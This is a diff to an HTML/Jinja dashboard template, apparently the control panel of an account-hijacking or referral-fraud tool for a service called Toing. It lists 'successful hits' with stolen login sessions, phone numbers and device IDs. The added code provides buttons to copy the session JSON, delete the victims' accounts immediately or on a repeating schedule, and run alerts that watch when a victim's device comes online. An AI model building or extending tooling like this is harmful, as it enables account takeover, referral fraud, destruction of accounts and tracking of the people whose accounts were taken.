@@ -32,25 +32,36 @@ background:rgba(34,211,238,.1);border:1px solid rgba(34,211,238,.2);padding:8px 
 border-radius:16px;padding:20px 22px;margin-bottom:16px;transition:.2s}
 .hit:hover{border-color:rgba(34,211,238,.3)}
 .hit-top{display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap}
+.badges{display:flex;gap:8px;flex-wrap:wrap}
 .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 13px;border-radius:99px;font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.7px}
 .badge.cash{background:rgba(52,211,153,.13);color:var(--green);box-shadow:inset 0 0 0 1px rgba(52,211,153,.2)}
 .badge.ref{background:rgba(34,211,238,.13);color:var(--cyan);box-shadow:inset 0 0 0 1px rgba(34,211,238,.2)}
+.badge.deleted{background:rgba(52,211,153,.16);color:var(--green);box-shadow:inset 0 0 0 1px rgba(52,211,153,.3)}
+.badge.notdeleted{background:rgba(248,113,113,.12);color:var(--red);box-shadow:inset 0 0 0 1px rgba(248,113,113,.2)}
 .time{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--muted)}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:12px;margin-top:16px}
 .f{background:rgba(255,255,255,.025);border:1px solid var(--border);border-radius:10px;padding:11px 13px}
 .f .l{font-size:9.5px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);font-weight:800}
 .f .v{font-family:'JetBrains Mono',monospace;font-size:12.5px;margin-top:6px;word-break:break-all;color:var(--text)}
-.actions{display:flex;gap:9px;margin-top:16px;flex-wrap:wrap}
+.actions{display:flex;gap:9px;margin-top:16px;flex-wrap:wrap;align-items:center}
 .btn{padding:8px 15px;border:none;border-radius:9px;font-size:11.5px;font-weight:800;cursor:pointer;transition:.2s;
 background:rgba(255,255,255,.06);color:var(--text);border:1px solid var(--border)}
 .btn:hover{transform:translateY(-1px);background:rgba(255,255,255,.1)}
 .btn-copy{background:linear-gradient(135deg,var(--cyan),#0ea5e9);color:#06212b;border-color:transparent}
+.btn-del{background:linear-gradient(135deg,#f87171,#ef4444);color:#fff;border-color:transparent}
+.btn-sched{background:rgba(167,139,250,.16);color:var(--violet);border-color:rgba(167,139,250,.3)}
+.btn-online{background:rgba(251,191,36,.14);color:var(--amber);border-color:rgba(251,191,36,.3)}
+.btn-remove{background:rgba(248,113,113,.1);color:var(--red);border-color:rgba(248,113,113,.25)}
+.auto{display:none;margin-top:16px;padding-top:14px;border-top:1px dashed var(--border);gap:10px;align-items:center;flex-wrap:wrap}
+.auto.open{display:flex}
+.auto input{padding:7px 10px;background:var(--panel2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;width:110px}
+.jobline{font-size:11px;color:var(--violet);margin-left:4px}
 .sess{display:none;margin-top:14px}
 .sess.open{display:block}
 .sess pre{background:#070c17;border:1px solid var(--border);border-radius:10px;padding:14px;
 font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.6;overflow:auto;max-height:320px;color:#a7f3d0;white-space:pre-wrap;word-break:break-all}
 .toast{position:fixed;bottom:26px;right:26px;background:var(--green);color:#06281c;padding:11px 18px;
-border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY(10px);transition:.25s;pointer-events:none}
+border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY(10px);transition:.25s;pointer-events:none;z-index:50}
 .toast.show{opacity:1;transform:none}
 .empty{text-align:center;padding:70px 20px;color:var(--muted)}
 .empty .big{font-size:42px;margin-bottom:12px}
@@ -64,16 +75,21 @@ border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY
 </nav>
 <div class="wrap">
   <div class="head">
-    <div><h1>Successful Hits</h1><p>Every claimed account with its full login session — click to reveal, one click to copy.</p></div>
+    <div><h1>Successful Hits</h1><p>Every claimed account — reveal, copy, delete, and device online alerts.</p></div>
     <div class="count">{{ hits|length }} hits</div>
   </div>
 
   {% for h in hits %}
   <div class="hit">
     <div class="hit-top">
-      <span class="badge {{ 'cash' if h.outcome.startswith('REFERRAL CASH') else 'ref' }}">
-        {{ '💰' if h.outcome.startswith('REFERRAL CASH') else '🔗' }} {{ h.outcome }}
-      </span>
+      <div class="badges">
+        <span class="badge {{ 'cash' if h.outcome.startswith('REFERRAL CASH') else 'ref' }}">
+          {{ '💰' if h.outcome.startswith('REFERRAL CASH') else '🔗' }} {{ h.outcome }}
+        </span>
+        <span class="badge {{ 'deleted' if h.deleted else 'notdeleted' }}" id="dstat{{ loop.index0 }}">
+          {{ '🗑 DELETED' if h.deleted else '⏳ NOT DELETED' }}
+        </span>
+      </div>
       <span class="time">{{ h.at }}</span>
     </div>
     <div class="grid">
@@ -84,10 +100,27 @@ border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY
     </div>
     <div class="actions">
       <button class="btn" onclick="toggleSess('s{{ loop.index0 }}')">👁 Show login session</button>
-      <button class="btn btn-copy" onclick="copyText({{ h.session_text|tojson }})">⧉ Copy session JSON</button>
-      <button class="btn" onclick="copyText({{ h.number|tojson }})">⧉ Copy number</button>
-      <button class="btn" onclick="copyText({{ h.device_id|tojson }})">⧉ Copy device id</button>
-      <button class="btn" onclick="copyText({{ h.db|tojson }})">⧉ Copy DB</button>
+      <button class="btn btn-copy" onclick='copyText({{ h.session_text|tojson }})'>⧉ Copy session JSON</button>
+      <button class="btn" onclick='copyText({{ h.number|tojson }})'>⧉ Copy number</button>
+      <button class="btn" onclick='copyText({{ h.device_id|tojson }})'>⧉ Copy device id</button>
+      <button class="btn" onclick='copyText({{ h.db|tojson }})'>⧉ Copy DB</button>
+      {% if not h.deleted %}
+      <button class="btn btn-del" onclick='deleteNow({{ h.number|tojson }}, {{ loop.index0 }})'>🗑 Delete account</button>
+      {% endif %}
+      <button class="btn btn-sched" onclick="toggleAuto('a{{ loop.index0 }}')">⏰ Auto delete / online alert</button>
+      <button class="btn btn-remove" onclick='removeHit({{ h.number|tojson }})'>✕ Remove hit</button>
+      {% if h.job_id %}<span class="jobline">scheduled job {{ h.job_id }} (every {{ h.job_interval }}s)</span>{% endif %}
+      {% if h.watch_id %}<span class="jobline">online watch {{ h.watch_id }}</span>{% endif %}
+    </div>
+    <div class="auto" id="a{{ loop.index0 }}">
+      <label style="font-size:11px;color:var(--muted)">Retry every (seconds)</label>
+      <input type="number" id="iv{{ loop.index0 }}" value="7200" min="30">
+      <button class="btn btn-sched" onclick='scheduleDelete({{ h.number|tojson }}, {{ loop.index0 }})'>▶ Start auto delete</button>
+      <button class="btn" onclick='cancelJob({{ (h.job_id or "")|tojson }})'>■ Cancel job</button>
+      <label style="font-size:11px;color:var(--muted);margin-left:8px">Alert duration (s)</label>
+      <input type="number" id="du{{ loop.index0 }}" value="3600" min="30">
+      <button class="btn btn-online" onclick='startOnline({{ h.number|tojson }}, {{ loop.index0 }})'>📡 Start online alert</button>
+      <button class="btn" onclick='cancelWatch({{ (h.watch_id or "")|tojson }})'>■ Cancel watch</button>
     </div>
     <div class="sess" id="s{{ loop.index0 }}"><pre>{{ h.session_text if h.session_text else '(session file not found)' }}</pre></div>
   </div>
@@ -95,18 +128,71 @@ border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY
   <div class="empty"><div class="big">🏆</div><h2>No hits yet</h2><p>Successful referrals will appear here with their sessions.</p></div>
   {% endfor %}
 </div>
-<div class="toast" id="toast">Copied!</div>
+<div class="toast" id="toast">Done</div>
 <script>
 function toggleSess(id){document.getElementById(id).classList.toggle('open');}
+function toggleAuto(id){document.getElementById(id).classList.toggle('open');}
+function toast(msg,ok){
+  const el=document.getElementById('toast');
+  el.textContent=msg; el.style.background=ok?'var(--green)':'var(--red)';
+  el.classList.add('show'); setTimeout(()=>el.classList.remove('show'),2000);
+}
+function copied(ok){toast(ok?'Copied!':'Copy failed - select manually',ok);}
+function fallbackCopy(t){
+  try{
+    const ta=document.createElement('textarea');
+    ta.value=t; ta.style.position='fixed'; ta.style.opacity='0';
+    document.body.appendChild(ta); ta.focus(); ta.select(); ta.setSelectionRange(0,t.length);
+    const ok=document.execCommand('copy');
+    document.body.removeChild(ta); copied(ok);
+  }catch(e){ copied(false); }
+}
 function copyText(t){
-  navigator.clipboard.writeText(t).then(()=>{
-    const el=document.getElementById('toast');el.classList.add('show');
-    setTimeout(()=>el.classList.remove('show'),1400);
-  }).catch(()=>{
-    const ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();
-    document.execCommand('copy');document.body.removeChild(ta);
-    const el=document.getElementById('toast');el.classList.add('show');
-    setTimeout(()=>el.classList.remove('show'),1400);
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(()=>copied(true)).catch(()=>fallbackCopy(t));
+  }else{ fallbackCopy(t); }
+}
+function post(url,body,cb){
+  fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})})
+    .then(r=>r.json()).then(d=>cb(d)).catch(()=>toast('Request failed',false));
+}
+function deleteNow(number,idx){
+  if(!confirm('Permanently delete the Toing account for '+number+'?'))return;
+  post('/api/hits/delete',{number:number},d=>{
+    toast(d.message||d.status,d.status==='success'||d.status==='scheduled');
+    if(d.status==='success'){
+      const b=document.getElementById('dstat'+idx);
+      if(b){b.className='badge deleted';b.textContent='🗑 DELETED';}
+    } else if(d.status==='scheduled'){ setTimeout(()=>location.reload(),1200); }
+  });
+}
+function scheduleDelete(number,idx){
+  const iv=parseInt(document.getElementById('iv'+idx).value)||7200;
+  post('/api/hits/delete/schedule',{number:number,interval:iv},d=>{
+    toast(d.status==='success'?('Auto delete started every '+iv+'s'):(d.message||'Failed'),d.status==='success');
+    if(d.status==='success')setTimeout(()=>location.reload(),800);
+  });
+}
+function cancelJob(id){
+  if(!id){toast('No job to cancel',false);return;}
+  post('/api/hits/delete/cancel',{job_id:id},()=>location.reload());
+}
+function startOnline(number,idx){
+  const du=parseInt(document.getElementById('du'+idx).value)||3600;
+  post('/api/hits/online-alert',{number:number,duration:du},d=>{
+    toast(d.status==='success'?('Online alert running '+du+'s'):(d.message||'Failed'),d.status==='success');
+    if(d.status==='success')setTimeout(()=>location.reload(),800);
+  });
+}
+function cancelWatch(id){
+  if(!id){toast('No watch to cancel',false);return;}
+  post('/api/hits/online-alert/cancel',{watch_id:id},()=>location.reload());
+}
+function removeHit(number){
+  if(!confirm('Remove this hit and delete its saved session?'))return;
+  post('/api/hits/remove',{number:number},d=>{
+    toast(d.message||d.status,d.status==='success');
+    if(d.status==='success')setTimeout(()=>location.reload(),600);
   });
 }
 </script>
